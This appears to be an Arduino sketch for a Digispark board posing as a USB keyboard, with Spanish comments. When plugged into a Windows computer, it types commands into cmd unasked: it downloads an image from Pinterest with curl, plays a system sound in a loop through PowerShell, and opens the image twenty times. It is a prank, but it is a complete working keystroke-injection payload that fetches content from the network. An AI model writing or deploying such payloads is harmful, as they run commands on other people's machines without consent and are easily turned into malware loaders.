#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.delay(4000);

  // Win + R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);

  // CMD
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);

  // Ir al escritorio
  DigiKeyboard.print("cd %USERPROFILE%\\Desktop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Descargar imagen
  DigiKeyboard.print("curl https://i.pinimg.com/236x/b0/f0/52/b0f0524e80ed52cf5a38d0fa93035a95.jpg -o g.jpg");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  // SONIDO CONTINUO EN SEGUNDO PLANO (~10s)
  DigiKeyboard.print("start /b powershell -c \"for($i=0;$i -lt 20;$i++){(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Hardware Remove.wav').PlaySync()}\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200); // no espera

  // Abrir imagen 20 veces (mientras suena)
  DigiKeyboard.print("for /L %i in (1,1,20) do start g.jpg");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Cerrar CMD
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}